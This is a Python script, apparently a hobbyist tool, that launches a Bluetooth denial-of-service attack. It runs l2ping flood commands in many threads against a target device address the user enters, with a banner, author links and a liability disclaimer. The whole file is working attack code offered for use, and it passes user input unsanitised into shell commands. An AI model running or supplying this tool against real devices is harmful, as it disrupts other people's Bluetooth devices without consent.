import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():logo = """
\033[1;91m 
	 __  ________ ___    __ __ ______   _  __
   /  |/  / ___//   |  / //_//  _/ /  | |/ /
  / /|_/ /\__ \/ /| | / ,<   / // /   |   / 
 / /  / /___/ / ___ |/ /| |_/ // /___/   |  
/_/  /_//____/_/  |_/_/ |_/___/_____/_/|_|                                                                                                        
───  ───  ──── ──── ──── ──── \033[92;1m MADE WITH MAK-GANG LOVE
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
\x1b[1;90m[+] Author     :   Mir Sakil Ahmed xs
\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :   https://www.facebook.com/profile.php?id=100087152546518
\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      :   https://github.com/msakilx
\x1b[1;98m[+] FROM        :   Bluetooth dos attack msakilx
\x1b[1;93m[+] 𝗧𝗘𝗔𝗠        :   \33[1;42 Cyber xsehg  \33[0m
\x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m  0.0.1    \x1b[1;97m          
\033[1;80m•••••••••••••••••••••••••••••••••••••••••••••• 
"""
    

def main():
    printLogo()
    time.sleep(0.1)
    print('')
    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
    print('___________________________________________________')
    print('To use this toos. you need to connect the Bluetooth modul) ')
    print('__________________________________________________')
    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')

        target_addr = input('Target addr > ')

        if len(target_addr) < 1:
            print('[!] ERROR: Target addr is missing')
            exit(0)

        try:
            packages_size = int(input('Packages size > '))
        except:
            print('[!] ERROR: Packages size must be an integer')
            exit(0)
        try:
            threads_count = int(input('Threads count > '))
        except:
            print('[!] ERROR: Threads count must be an integer')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] Building threads...\n')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Built all threads...')
        print('[*] Starting...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
        main()